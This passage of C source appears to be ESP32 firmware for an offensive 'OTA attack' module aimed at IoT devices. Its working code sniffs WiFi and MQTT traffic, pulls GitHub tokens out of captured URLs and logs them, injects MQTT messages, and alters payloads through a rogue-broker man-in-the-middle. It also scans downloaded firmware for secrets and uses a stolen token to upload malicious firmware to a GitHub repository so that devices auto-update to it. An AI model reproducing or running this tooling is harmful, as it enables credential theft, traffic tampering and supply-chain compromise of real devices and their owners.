                if (is_github_url(url)) {
                    entry->has_github_token = true;
                    github_url_count++;
                    ESP_LOGI(TAG, "GITHUB URL (raw): %s", url);

                    char token[128] = "";
                    extract_github_token(url, token, sizeof(token));
                    if (token[0]) {
                        ESP_LOGI(TAG, "GITHUB TOKEN extracted: %s", token);
                    }
                }

                url_entries++;
                url_count++;

                ESP_LOGI(TAG, "Captured URL (raw) [%d]: %s",
                         (int)url_count, url);
            }
        }

        http_pos += ui > 0 ? ui : 1;
        if (ui == 0) break;
    }

    free(buf);
}

/* ================================================================== */
/*  WiFi event handler                                                 */
/* ================================================================== */

static bool wifi_connected = false;
static bool wifi_has_ip = false;

static void wifi_event_handler(void *arg, esp_event_base_t event_base,
                                int32_t event_id, void *event_data)
{
    if (event_base == WIFI_EVENT) {
        if (event_id == WIFI_EVENT_STA_START) {
            ESP_LOGI(TAG, "WiFi STA started, connecting...");
            esp_wifi_connect();
        } else if (event_id == WIFI_EVENT_STA_CONNECTED) {
            wifi_connected = true;
            ESP_LOGI(TAG, "WiFi STA connected to AP");
        } else if (event_id == WIFI_EVENT_STA_DISCONNECTED) {
            wifi_connected = false;
            wifi_has_ip = false;
            ESP_LOGW(TAG, "WiFi STA disconnected");
            if (running) {
                esp_wifi_connect();
            }
        }
    } else if (event_base == IP_EVENT) {
        if (event_id == IP_EVENT_STA_GOT_IP) {
            wifi_has_ip = true;
            ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
            ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
            if (wifi_sem) xSemaphoreGive(wifi_sem);
        }
    }
}

/* ================================================================== */
/*  MQTT event handler                                                 */
/* ================================================================== */

static void mqtt_event_handler(void *handler_args, esp_event_base_t base,
                                int32_t event_id, void *event_data)
{
    esp_mqtt_event_handle_t event = (esp_mqtt_event_handle_t)event_data;

    switch (event_id) {
    case MQTT_EVENT_CONNECTED:
        mqtt_connected = true;
        ESP_LOGI(TAG, "MQTT connected to broker");
        attack_state = OTA_STATE_SUBSCRIBED;

        if (cfg.mode == OTA_MODE_CLIENT || cfg.mode == OTA_MODE_SNIFF ||
            cfg.mode == OTA_MODE_GITHUB_TAKEOVER) {
            int msg_id = esp_mqtt_client_subscribe(mqtt_client,
                                                    cfg.subscribe_topic, 1);
            ESP_LOGI(TAG, "Subscribed to topic '%s' (msg_id=%d)",
                     cfg.subscribe_topic, msg_id);
            attack_state = OTA_STATE_WAITING_OTA;
        }

        if (mqtt_sem) xSemaphoreGive(mqtt_sem);
        break;

    case MQTT_EVENT_DISCONNECTED:
        mqtt_connected = false;
        ESP_LOGW(TAG, "MQTT disconnected");
        attack_state = OTA_STATE_DISCONNECTED;
        break;

    case MQTT_EVENT_DATA:
        {
            char topic[OTA_MAX_TOPIC_LEN] = "";
            int tlen = event->topic_len < OTA_MAX_TOPIC_LEN - 1 ?
                       event->topic_len : OTA_MAX_TOPIC_LEN - 1;
            memcpy(topic, event->topic, tlen);
            topic[tlen] = '\0';

            ESP_LOGI(TAG, "MQTT RECV: topic=%s len=%d", topic, event->data_len);

            store_captured_message(event->topic, event->topic_len,
                                  event->data, event->data_len);

            scan_payload_for_urls(topic, event->data, event->data_len);

            /* ROGUE_BROKER: Intercept and optionally modify MQTT messages */
            if (cfg.mode == OTA_MODE_ROGUE_BROKER && mitm_entry_count < OTA_MAX_MITM_MSGS) {
                ota_mitm_entry_t *mitm = &mitm_entries[mitm_entry_count];
                strncpy(mitm->original_topic, topic, OTA_MAX_MITM_TOPIC_LEN - 1);
                int mplen = event->data_len < OTA_MAX_MITM_PAYLOAD_LEN - 1 ?
                           event->data_len : OTA_MAX_MITM_PAYLOAD_LEN - 1;
                memcpy(mitm->original_payload, event->data, mplen);
                mitm->original_payload[mplen] = '\0';
                mitm->timestamp_ms = now_ms();
                mitm->was_modified = false;
                mitm->direction_upload = true;

                /* Check if we should modify this message */
                if (cfg.rb_modify_payloads && rb_active_modify_topic[0] != '\0') {
                    bool topic_match = (strcmp(topic, rb_active_modify_topic) == 0 ||
                                       strstr(topic, rb_active_modify_topic) != NULL ||
                                       strcmp(rb_active_modify_topic, "#") == 0);
                    if (topic_match) {
                        strncpy(mitm->modified_topic, topic, OTA_MAX_MITM_TOPIC_LEN - 1);
                        strncpy(mitm->modified_payload, rb_active_modify_payload,
                                OTA_MAX_MITM_PAYLOAD_LEN - 1);
                        mitm->was_modified = true;
                        mitm_modified_count++;

                        if (mqtt_connected && mqtt_client) {
                            esp_mqtt_client_publish(mqtt_client, topic,
                                                     rb_active_modify_payload, 0, 1, 0);
                            mitm_forwarded_count++;
                            attack_state = OTA_STATE_RB_MODIFYING;
                            ESP_LOGI(TAG, "ROGUE_BROKER: Modified message on topic: %s", topic);
                        }
                    } else {
                        mitm_forwarded_count++;
                        attack_state = OTA_STATE_RB_FORWARDING;
                    }
                }

                mitm_entry_count++;
                mitm_count++;
                rb_summary.messages_intercepted = mitm_count;
                rb_summary.messages_modified = mitm_modified_count;
                rb_summary.messages_forwarded = mitm_forwarded_count;
            }

            if (strstr(topic, "ota") || strstr(topic, "update") ||
                strstr(topic, "firmware") || strstr(topic, "upgrade") ||
                strstr(topic, "release") || strstr(topic, "download")) {
                ESP_LOGI(TAG, "=== OTA-related message detected on topic: %s ===", topic);
            }
        }
        break;

    case MQTT_EVENT_ERROR:
        ESP_LOGW(TAG, "MQTT error event");
        fail_count++;
        break;

    default:
        break;
    }
}

/* ================================================================== */
/*  Firmware download                                                  */
/* ================================================================== */

static char http_recv_buffer[HTTP_RECV_BUFFER_SIZE];

static esp_err_t http_event_handler_cb(esp_http_client_event_t *evt)
{
    switch (evt->event_id) {
    case HTTP_EVENT_ON_DATA:
        if (firmware_buffer && firmware_downloaded_size + evt->data_len <= MAX_FIRMWARE_DOWNLOAD_SIZE) {
            memcpy(firmware_buffer + firmware_downloaded_size,
                   evt->data, evt->data_len);
            firmware_downloaded_size += evt->data_len;
        }
        break;
    default:
        break;
    }
    return ESP_OK;
}

static esp_err_t download_firmware_internal(const char *url)
{
    ESP_LOGI(TAG, "Downloading firmware from: %s", url);

    attack_state = OTA_STATE_DOWNLOADING;

    if (firmware_buffer) {
        free(firmware_buffer);
        firmware_buffer = NULL;
    }
    firmware_buffer = malloc(MAX_FIRMWARE_DOWNLOAD_SIZE);
    if (!firmware_buffer) {
        ESP_LOGE(TAG, "Failed to allocate firmware buffer");
        fail_count++;
        return ESP_ERR_NO_MEM;
    }
    firmware_downloaded_size = 0;

    esp_http_client_config_t http_cfg = {
        .url = url,
        .event_handler = http_event_handler_cb,
        .timeout_ms = 30000,
        .buffer_size = HTTP_RECV_BUFFER_SIZE,
        .user_data = http_recv_buffer,
    };

    if (!cfg.verify_ssl) {
        http_cfg.skip_cert_common_name_check = true;
        http_cfg.cert_pem = NULL;
    }

    esp_http_client_handle_t client = esp_http_client_init(&http_cfg);
    if (!client) {
        ESP_LOGE(TAG, "Failed to init HTTP client");
        free(firmware_buffer);
        firmware_buffer = NULL;
        fail_count++;
        return ESP_FAIL;
    }

    esp_err_t err = esp_http_client_perform(client);
    int status_code = esp_http_client_get_status_code(client);
    int64_t content_length = esp_http_client_get_content_length(client);

    if (err == ESP_OK && (status_code == 200 || status_code == 302)) {
        ESP_LOGI(TAG, "Firmware downloaded: %u bytes (content-length: %lld)",
                 (unsigned)firmware_downloaded_size, (long long)content_length);
        download_count++;
        attack_state = OTA_STATE_DOWNLOADED;

        for (int i = 0; i < url_entries; i++) {
            if (strcmp(captured_urls[i].url, url) == 0) {
                captured_urls[i].downloaded = true;
                captured_urls[i].firmware_size = firmware_downloaded_size;
            }
        }

        snprintf(download_result_json, sizeof(download_result_json),
                 "{\"success\":true,\"url\":\"%s\",\"size\":%u,\"status\":%d}",
                 url, (unsigned)firmware_downloaded_size, status_code);
    } else {
        ESP_LOGE(TAG, "HTTP download failed: err=%d status=%d", err, status_code);
        fail_count++;
        snprintf(download_result_json, sizeof(download_result_json),
                 "{\"success\":false,\"url\":\"%s\",\"status\":%d,\"error\":\"HTTP %d\"}",
                 url, status_code, status_code);
        free(firmware_buffer);
        firmware_buffer = NULL;
    }

    esp_http_client_cleanup(client);

    if (download_sem) xSemaphoreGive(download_sem);
    return err;
}

/* ================================================================== */
/*  Timeout timer                                                      */
/* ================================================================== */

static void timeout_cb(void *arg)
{
    (void)arg;
    timeout_fired = true;
    running       = false;
    ESP_LOGW(TAG, "Timeout expired -- stopping OTA attack");
}

/* ================================================================== */
/*  WiFi STA connection                                                */
/* ================================================================== */

static esp_err_t connect_to_wifi(void)
{
    attack_state = OTA_STATE_WIFI_CONNECTING;

    ESP_LOGI(TAG, "Connecting to WiFi SSID: %s", cfg.wifi_ssid);

    static bool handlers_registered = false;
    if (!handlers_registered) {
        esp_event_handler_instance_t instance_any_id;
        esp_event_handler_instance_t instance_got_ip;
        esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                             &wifi_event_handler, NULL,
                                             &instance_any_id);
        esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                             &wifi_event_handler, NULL,
                                             &instance_got_ip);
        handlers_registered = true;
    }

    wifi_config_t sta_cfg = {0};
    strncpy((char *)sta_cfg.sta.ssid, cfg.wifi_ssid, sizeof(sta_cfg.sta.ssid) - 1);
    strncpy((char *)sta_cfg.sta.password, cfg.wifi_password, sizeof(sta_cfg.sta.password) - 1);
    if (cfg.wifi_password[0] == '\0') {
        sta_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
    } else {
        sta_cfg.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    }

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(ESP_IF_WIFI_STA, &sta_cfg);
    esp_wifi_start();

    if (wifi_sem) xSemaphoreTake(wifi_sem, 0);
    if (xSemaphoreTake(wifi_sem, pdMS_TO_TICKS(WIFI_CONNECT_TIMEOUT_MS)) != pdTRUE) {
        ESP_LOGE(TAG, "WiFi connection timeout");
        fail_count++;
        return ESP_ERR_TIMEOUT;
    }

    ESP_LOGI(TAG, "WiFi connected with IP");
    return ESP_OK;
}

/* ================================================================== */
/*  MQTT connection                                                    */
/* ================================================================== */

static esp_err_t connect_to_mqtt(void)
{
    attack_state = OTA_STATE_MQTT_CONNECTING;

    if (cfg.mqtt_broker[0] == '\0') {
        ESP_LOGE(TAG, "No MQTT broker configured");
        fail_count++;
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Connecting to MQTT broker: %s:%u",
             cfg.mqtt_broker, (unsigned)cfg.mqtt_port);

    char broker_uri[192];
    snprintf(broker_uri, sizeof(broker_uri), "mqtt://%s:%u",
             cfg.mqtt_broker, (unsigned)cfg.mqtt_port);

    esp_mqtt_client_config_t mqtt_cfg = {
        .uri = broker_uri,
        .client_id = cfg.mqtt_client_id,
    };

    if (cfg.mqtt_username[0] != '\0') {
        mqtt_cfg.username = cfg.mqtt_username;
        mqtt_cfg.password = cfg.mqtt_password;
    }

    mqtt_client = esp_mqtt_client_init(&mqtt_cfg);
    if (!mqtt_client) {
        ESP_LOGE(TAG, "Failed to init MQTT client");
        fail_count++;
        return ESP_FAIL;
    }

    esp_mqtt_client_register_event(mqtt_client, ESP_EVENT_ANY_ID,
                                    mqtt_event_handler, NULL);
    esp_mqtt_client_start(mqtt_client);

    if (mqtt_sem) xSemaphoreTake(mqtt_sem, 0);
    if (xSemaphoreTake(mqtt_sem, pdMS_TO_TICKS(MQTT_CONNECT_TIMEOUT_MS)) != pdTRUE) {
        ESP_LOGE(TAG, "MQTT connection timeout");
        fail_count++;
        return ESP_ERR_TIMEOUT;
    }

    ESP_LOGI(TAG, "MQTT connected successfully");
    return ESP_OK;
}

/* ================================================================== */
/*  Main attack task                                                   */
/* ================================================================== */

static void attack_task(void *arg)
{
    (void)arg;

    ESP_LOGI(TAG, "OTA attack task started (mode=%s timeout=%us)",
             mode_str(cfg.mode), (unsigned)cfg.timeout_sec);

    start_time_ms = now_ms();

    /* ---- Mode: POLL_SNIFF ---- */
    if (cfg.mode == OTA_MODE_POLL_SNIFF) {
        /* Connect to WiFi first */
        if (cfg.wifi_ssid[0] != '\0') {
            if (connect_to_wifi() != ESP_OK) {
                ESP_LOGE(TAG, "WiFi connection failed, entering sniff-only mode");
            }
        }

        attack_state = OTA_STATE_POLL_SNIFFING;
        ESP_LOGI(TAG, "Starting promiscuous WiFi sniff for DNS/HTTP OTA patterns");

        /* Set promiscuous mode callback and enable */
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);

        /* Main sniff loop */
        while (running) {
            vTaskDelay(pdMS_TO_TICKS(1000));
        }

        /* Cleanup */
        esp_wifi_set_promiscuous(false);
        attack_state = OTA_STATE_IDLE;

        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;

        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* ---- Mode: FETCH (direct download, no MQTT) ---- */
    if (cfg.mode == OTA_MODE_FETCH) {
        if (cfg.wifi_ssid[0] != '\0') {
            if (connect_to_wifi() != ESP_OK) {
                ESP_LOGE(TAG, "WiFi connection failed, cannot download");
                attack_state = OTA_STATE_ERROR;
                if (timeout_timer) esp_timer_stop(timeout_timer);
                running = false;
                if (task_exit_sem) xSemaphoreGive(task_exit_sem);
                task_handle = NULL;
                vTaskDelete(NULL);
                return;
            }
        }

        const char *url = cfg.firmware_url[0] ? cfg.firmware_url : NULL;
        if (!url && url_entries > 0) {
            url = captured_urls[0].url;
        }

        if (url) {
            download_firmware_internal(url);
        } else {
            ESP_LOGE(TAG, "No firmware URL specified");
            attack_state = OTA_STATE_ERROR;
            fail_count++;
        }

        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;

        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* ---- Modes: SNIFF, CLIENT, INJECT ---- */
    /* All need WiFi connection first */
    if (cfg.wifi_ssid[0] != '\0') {
        if (connect_to_wifi() != ESP_OK) {
            ESP_LOGE(TAG, "WiFi connection failed");
            attack_state = OTA_STATE_ERROR;

            if (timeout_timer) esp_timer_stop(timeout_timer);
            running = false;
            if (task_exit_sem) xSemaphoreGive(task_exit_sem);
            task_handle = NULL;
            vTaskDelete(NULL);
            return;
        }
    }

    /* Connect to MQTT broker */
    if (connect_to_mqtt() != ESP_OK) {
        ESP_LOGE(TAG, "MQTT connection failed");
        attack_state = OTA_STATE_ERROR;

        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;
        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* ---- Mode: INJECT ---- */
    if (cfg.mode == OTA_MODE_INJECT) {
        attack_state = OTA_STATE_INJECTING;
        ESP_LOGI(TAG, "Injecting OTA message to topic: %s", cfg.inject_topic);

        for (uint32_t i = 0; i < cfg.inject_count && running; i++) {
            int msg_id = esp_mqtt_client_publish(mqtt_client,
                                                  cfg.inject_topic,
                                                  cfg.inject_payload, 0,
                                                  1, 0);
            if (msg_id >= 0) {
                inject_count++;
                ESP_LOGI(TAG, "Injected message #%d (msg_id=%d)", (int)inject_count, msg_id);

                /* Also store in captured messages */
                store_captured_message(cfg.inject_topic, strlen(cfg.inject_topic),
                                      cfg.inject_payload, strlen(cfg.inject_payload));

                /* Scan for URLs in injected payload */
                scan_payload_for_urls(cfg.inject_topic, cfg.inject_payload, strlen(cfg.inject_payload));
            } else {
                ESP_LOGW(TAG, "Failed to inject message");
                fail_count++;
            }

            if (i < cfg.inject_count - 1 && cfg.inject_interval_ms > 0) {
                vTaskDelay(pdMS_TO_TICKS(cfg.inject_interval_ms));
            }
        }

        attack_state = OTA_STATE_INJECTED;

        /* Stay connected to capture any responses */
        while (running && mqtt_connected) {
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
    }

    /* ---- Modes: SNIFF, CLIENT ---- */
    if (cfg.mode == OTA_MODE_SNIFF || cfg.mode == OTA_MODE_CLIENT) {
        ESP_LOGI(TAG, "Listening for MQTT messages on topic: %s", cfg.subscribe_topic);

        /* Also start promiscuous sniff if WiFi STA is connected */
        if (wifi_has_ip) {
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
        }

        /* Main loop - wait for messages or timeout */
        while (running && mqtt_connected) {
            vTaskDelay(pdMS_TO_TICKS(1000));
        }

        esp_wifi_set_promiscuous(false);
    }

    /* ---- Mode: PROVISION_SNIFF ---- */
    /* Captures ALL config creds (WiFi, MQTT, Modbus) because the
     * ESP32 provisioning web server uses plain HTTP with zero encryption.
     * Uses WiFi promiscuous mode to sniff HTTP POST on the target network. */
    if (cfg.mode == OTA_MODE_PROVISION_SNIFF) {
        if (cfg.wifi_ssid[0] != '\0') {
            if (connect_to_wifi() != ESP_OK) {
                ESP_LOGE(TAG, "PROVISION_SNIFF: WiFi connection failed");
                attack_state = OTA_STATE_ERROR;
                if (timeout_timer) esp_timer_stop(timeout_timer);
                running = false;
                if (task_exit_sem) xSemaphoreGive(task_exit_sem);
                task_handle = NULL;
                vTaskDelete(NULL);
                return;
            }
        }

        attack_state = OTA_STATE_PROV_SNIFFING;
        ESP_LOGI(TAG, "PROVISION_SNIFF: Starting HTTP provision traffic capture");
        ESP_LOGI(TAG, "  Target: %s (sniffing for HTTP POST with config data)",
                 cfg.wifi_ssid[0] ? cfg.wifi_ssid : "any");

        /* Enable promiscuous mode to capture HTTP traffic */
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);

        /* Main sniff loop - the wifi_sniffer_cb handles packet parsing.
         * For PROVISION_SNIFF, we also parse HTTP POST bodies for config JSON */
        while (running) {
            vTaskDelay(pdMS_TO_TICKS(500));
        }

        esp_wifi_set_promiscuous(false);
        attack_state = OTA_STATE_IDLE;

        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;
        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* ---- Mode: ROGUE_BROKER ---- */
    /* Full MQTT MITM because the device connects via mqtt:// port 1883
     * with no TLS/cert verification. We impersonate the broker:
     * 1. ARP spoof the target device (optional)
     * 2. Start our own MQTT broker on port 1883
     * 3. Accept the device's MQTT connection
     * 4. Intercept all publish/subscribe messages
     * 5. Optionally modify payloads in transit
     * 6. Forward to the real broker */
    if (cfg.mode == OTA_MODE_ROGUE_BROKER) {
        if (cfg.wifi_ssid[0] != '\0') {
            if (connect_to_wifi() != ESP_OK) {
                ESP_LOGE(TAG, "ROGUE_BROKER: WiFi connection failed");
                attack_state = OTA_STATE_ERROR;
                if (timeout_timer) esp_timer_stop(timeout_timer);
                running = false;
                if (task_exit_sem) xSemaphoreGive(task_exit_sem);
                task_handle = NULL;
                vTaskDelete(NULL);
                return;
            }
        }

        attack_state = OTA_STATE_RB_STARTING;
        ESP_LOGI(TAG, "ROGUE_BROKER: Starting MQTT MITM attack");
        ESP_LOGI(TAG, "  Rogue port: %u, Real broker: %s:%u",
                 cfg.rb_rogue_port ? cfg.rb_rogue_port : 1883,
                 cfg.rb_real_broker_ip[0] ? cfg.rb_real_broker_ip : "auto-detect",
                 cfg.rb_real_broker_port ? cfg.rb_real_broker_port : 1883);

        /* Initialize rogue broker summary */
        memset(&rb_summary, 0, sizeof(rb_summary));
        rb_summary.rogue_port = cfg.rb_rogue_port ? cfg.rb_rogue_port : 1883;
        if (cfg.rb_real_broker_ip[0]) {
            strncpy(rb_summary.real_broker_ip, cfg.rb_real_broker_ip,
                    sizeof(rb_summary.real_broker_ip) - 1);
        }
        rb_summary.real_broker_port = cfg.rb_real_broker_port ? cfg.rb_real_broker_port : 1883;

        /* Connect to the real MQTT broker as a subscriber to intercept
         * messages from the cloud side, then start our own broker for
         * the target device. Since ESP32 cannot run a full MQTT broker,
         * we use the client approach: subscribe to all topics on the
         * real broker and re-publish intercepted messages. */
        if (cfg.mqtt_broker[0] != '\0' || cfg.rb_real_broker_ip[0] != '\0') {
            const char *broker = cfg.rb_real_broker_ip[0] ? cfg.rb_real_broker_ip : cfg.mqtt_broker;
            strncpy(cfg.mqtt_broker, broker, sizeof(cfg.mqtt_broker) - 1);
            cfg.mqtt_port = rb_summary.real_broker_port;

            if (connect_to_mqtt() == ESP_OK) {
                attack_state = OTA_STATE_RB_LISTENING;
                ESP_LOGI(TAG, "ROGUE_BROKER: Connected to real broker, intercepting messages");

                /* Subscribe to all topics to intercept both directions */
                esp_mqtt_client_subscribe(mqtt_client, "#", 1);

                /* Enable promiscuous mode for ARP spoofing if configured */
                if (cfg.rb_arp_spoof && wifi_has_ip) {
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
                    rb_summary.arp_spoof_active = true;
                    ESP_LOGI(TAG, "ROGUE_BROKER: ARP spoofing enabled");
                }

                /* Main MITM loop */
                while (running && mqtt_connected) {
                    attack_state = OTA_STATE_RB_INTERCEPTING;
                    vTaskDelay(pdMS_TO_TICKS(1000));
                }
            } else {
                ESP_LOGE(TAG, "ROGUE_BROKER: Failed to connect to real broker");
                attack_state = OTA_STATE_ERROR;
            }
        } else {
            ESP_LOGE(TAG, "ROGUE_BROKER: No broker configured");
            attack_state = OTA_STATE_ERROR;
        }

        esp_wifi_set_promiscuous(false);

        if (mqtt_client) {
            esp_mqtt_client_stop(mqtt_client);
            esp_mqtt_client_destroy(mqtt_client);
            mqtt_client = NULL;
            mqtt_connected = false;
        }

        attack_state = OTA_STATE_IDLE;
        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;
        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* ---- Mode: FIRMWARE_ANALYZE ---- */
    /* Extracts hardcoded secrets from any downloaded firmware binary
     * because there's no firmware encryption or signature verification.
     * Scans the firmware buffer for: WiFi credentials, MQTT credentials,
     * API keys, tokens, certificates, private keys, hardcoded URLs. */
    if (cfg.mode == OTA_MODE_FIRMWARE_ANALYZE) {
        attack_state = OTA_STATE_FW_ANALYZING;

        /* If we have a firmware URL, download it first */
        if (cfg.firmware_url[0] != '\0') {
            if (cfg.wifi_ssid[0] != '\0') {
                if (connect_to_wifi() != ESP_OK) {
                    ESP_LOGE(TAG, "FIRMWARE_ANALYZE: WiFi connection failed");
                    attack_state = OTA_STATE_ERROR;
                    if (timeout_timer) esp_timer_stop(timeout_timer);
                    running = false;
                    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
                    task_handle = NULL;
                    vTaskDelete(NULL);
                    return;
                }
            }
            download_firmware_internal(cfg.firmware_url);
        } else if (cfg.fw_analyze_url_index >= 0 && cfg.fw_analyze_url_index < url_entries) {
            /* Use a previously captured URL */
            if (!captured_urls[cfg.fw_analyze_url_index].downloaded) {
                if (cfg.wifi_ssid[0] != '\0') connect_to_wifi();
                download_firmware_internal(captured_urls[cfg.fw_analyze_url_index].url);
            }
        }

        /* Analyze the firmware buffer */
        if (firmware_buffer && firmware_downloaded_size > 0) {
            ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Analyzing %u bytes of firmware",
                     (unsigned)firmware_downloaded_size);
            int found = ota_attack_analyze_firmware();
            ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Found %d secrets (%u high confidence)",
                     found, (unsigned)fw_high_confidence_count);
            attack_state = OTA_STATE_FW_COMPLETE;
        } else {
            ESP_LOGE(TAG, "FIRMWARE_ANALYZE: No firmware data to analyze");
            attack_state = OTA_STATE_ERROR;
            fail_count++;
        }

        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;
        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* ---- Mode: GITHUB_TAKEOVER ---- */
    if (cfg.mode == OTA_MODE_GITHUB_TAKEOVER) {
        ESP_LOGI(TAG, "GITHUB TAKEOVER: Waiting for OTA message with firmware URL...");

        /* Phase 1: Wait for MQTT message with GitHub URL */
        int wait_loops = 0;
        int max_wait = (int)cfg.timeout_sec;
        while (running && mqtt_connected && github_url_count == 0 && wait_loops < max_wait) {
            vTaskDelay(pdMS_TO_TICKS(1000));
            wait_loops++;
        }

        if (github_url_count == 0) {
            ESP_LOGE(TAG, "GITHUB TAKEOVER: No GitHub URLs captured, aborting");
            attack_state = OTA_STATE_ERROR;
            fail_count++;
            goto takeover_cleanup;
        }

        ESP_LOGI(TAG, "GITHUB TAKEOVER: Found %u GitHub URL(s), starting repo takeover",
                 (unsigned)github_url_count);

        /* Phase 2: Find a GitHub URL with a token */
        int gh_idx = -1;
        for (int i = 0; i < url_entries; i++) {
            if (captured_urls[i].has_github_token) {
                char tok[128] = "";
                extract_github_token(captured_urls[i].url, tok, sizeof(tok));
                if (tok[0]) { gh_idx = i; break; }
            }
        }
        if (gh_idx < 0 && cfg.gh_captured_url_index >= 0) {
            gh_idx = cfg.gh_captured_url_index;
        }
        if (gh_idx < 0) gh_idx = 0;

        /* Phase 3: Parse GitHub URL */
        attack_state = OTA_STATE_GH_PARSING_URL;
        ota_github_repo_t repo;
        memset(&repo, 0, sizeof(repo));

        if (!ota_attack_parse_github_url(captured_urls[gh_idx].url, &repo)) {
            ESP_LOGE(TAG, "GITHUB TAKEOVER: Failed to parse URL: %s", captured_urls[gh_idx].url);
            attack_state = OTA_STATE_ERROR;
            fail_count++;
            goto takeover_cleanup;
        }

        ESP_LOGI(TAG, "GITHUB TAKEOVER: Parsed repo: %s/%s path=%s branch=%s",
                 repo.owner, repo.repo, repo.path, repo.branch);

        /* Phase 4: Access repo with token */
        attack_state = OTA_STATE_GH_ACCESSING_REPO;
        if (!ota_attack_github_access_repo(&repo)) {
            ESP_LOGE(TAG, "GITHUB TAKEOVER: Token does not have repo access");
            attack_state = OTA_STATE_ERROR;
            fail_count++;
            goto takeover_cleanup;
        }

        ESP_LOGI(TAG, "GITHUB TAKEOVER: Token verified, repo accessible (write=%d)",
                 repo.token_valid);

        /* Phase 5: Get file SHA for update */
        const char *target_path = cfg.gh_firmware_path[0] ? cfg.gh_firmware_path : repo.path;
        if (target_path[0]) {
            ota_attack_github_get_file_sha(&repo, target_path);
            ESP_LOGI(TAG, "GITHUB TAKEOVER: File SHA: %s", repo.file_sha);
        }

        /* Phase 6: List files in repo */
        attack_state = OTA_STATE_GH_LISTING_FILES;
        ota_attack_github_list_files(&repo, "");
        ESP_LOGI(TAG, "GITHUB TAKEOVER: Repo files listed");

        /* Phase 7: Upload malicious firmware */
        if (cfg.malicious_firmware && cfg.malicious_firmware_size > 0) {
            attack_state = OTA_STATE_GH_UPLOADING;
            const char *commit_msg = cfg.gh_commit_msg[0] ? cfg.gh_commit_msg : "Update firmware";

            bool uploaded = ota_attack_github_upload_firmware(
                &repo, cfg.malicious_firmware, cfg.malicious_firmware_size,
                target_path, commit_msg);

            if (uploaded) {
                attack_state = OTA_STATE_GH_UPLOADED;
                ESP_LOGI(TAG, "GITHUB TAKEOVER: Malicious firmware uploaded successfully!");

                /* Phase 8: Wait for device to pull the update */
                attack_state = OTA_STATE_GH_WAITING_DEVICE;
                ESP_LOGI(TAG, "GITHUB TAKEOVER: Waiting for device to auto-update...");

                int device_wait = (int)cfg.timeout_sec - wait_loops;
                if (device_wait > 120) device_wait = 120;
                for (int i = 0; i < device_wait && running; i++) {
                    vTaskDelay(pdMS_TO_TICKS(1000));
                }
            } else {
                ESP_LOGE(TAG, "GITHUB TAKEOVER: Firmware upload FAILED");
                attack_state = OTA_STATE_ERROR;
                fail_count++;
            }
        } else {
            ESP_LOGW(TAG, "GITHUB TAKEOVER: No malicious firmware provided, skipping upload");
            ESP_LOGW(TAG, "  Repo is accessible - upload firmware via dashboard API");
        }

takeover_cleanup:
        ;  /* Label needs a statement before cleanup */
    }

    /* ---- Cleanup ---- */
    if (mqtt_client) {
        esp_mqtt_client_stop(mqtt_client);
        esp_mqtt_client_destroy(mqtt_client);
        mqtt_client = NULL;
        mqtt_connected = false;
    }

    /* Restore WiFi to AP-only mode */
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();

    attack_state = OTA_STATE_IDLE;

    if (timeout_timer) esp_timer_stop(timeout_timer);
    running = false;

    ESP_LOGI(TAG, "OTA attack task exiting (msgs=%u, urls=%u, github=%u, downloads=%u, injects=%u, fails=%u)",
             (unsigned)mqtt_msg_count, (unsigned)url_count,
             (unsigned)github_url_count, (unsigned)download_count,
             (unsigned)inject_count, (unsigned)fail_count);

    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    task_handle = NULL;
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API -- Lifecycle                                            */
/* ================================================================== */

void ota_attack_init(void)
{
    mutex         = xSemaphoreCreateMutex();
    task_exit_sem = xSemaphoreCreateBinary();
    wifi_sem      = xSemaphoreCreateBinary();
    mqtt_sem      = xSemaphoreCreateBinary();
    download_sem  = xSemaphoreCreateBinary();

    esp_timer_create_args_t timer_args = {
        .callback = timeout_cb,
        .name     = "ota_attack_timeout",
    };
    esp_timer_create(&timer_args, &timeout_timer);

    ESP_LOGI(TAG, "OTA attack module initialized");
}

void ota_attack_start(ota_attack_mode_t mode, const char *wifi_ssid,
                      const char *wifi_password)
{
    ota_attack_config_t default_cfg = {
        .mode               = mode,
        .wifi_ssid          = "",
        .wifi_password      = "",
        .mqtt_broker        = "",
        .mqtt_port          = DEFAULT_MQTT_PORT,
        .mqtt_username      = "",
        .mqtt_password      = "",
